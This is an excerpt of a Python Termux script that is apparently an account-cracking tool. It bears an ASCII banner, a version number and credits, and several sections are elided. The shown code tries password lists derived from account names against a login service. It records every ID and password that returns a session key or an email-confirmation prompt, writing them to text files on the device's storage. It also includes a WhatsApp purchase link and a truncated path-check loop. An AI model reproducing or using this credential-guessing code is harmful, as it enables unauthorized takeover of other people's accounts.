...
888888    db    88  88 8b    d8 88 8888b.  
  88     dPYb   88  88 88b  d88 88  8I  Yb 
  88    dP__Yb  888888 88YbdP88 88  8I  dY 
  88   dP""""Yb 88  88 88 YY 88 88 8888Y"  
                                                 
{50*"-"}
    Tool Version :     1.3
    Thanks Alot  :     M.TAHMID Khan
{50*"-"}'''
...
def qsbuy():
        try:
                ...
                if str("upppdate") in update:
                        ...
                        os.system(f"termux-open-url https://wa.me/+8801990142727?text={bumper}")
                        qsbuy()
...
class crack_main():
        ...
        def m1(self,iid,name,passlist):
                try:
                        ...
                        sys.stdout.write('\r[Risha] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        fn = name.split(' ')[0]
                        try:
                                ln = name.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        print(' \033[1;32m[TAHMID-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/risha_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
                                elif 'Please Confirm Email' in po:
                                        print(' \033[1;32m[TAHMID-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/TAHMID_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
                                else:
                                        continue
        ...
        def pasw(self):
                ...
                print(' Ok Ids Save In : /sdcard/TAHMID_ok.txt')
                print(50*'-')
                input('\n Press enter to back ')
                main()
...
datar = []
datar.append(pat)
if '/data/data/com.termux/files/home/TAHMID' in datar:
        pass
else:
        for i in range(5000):
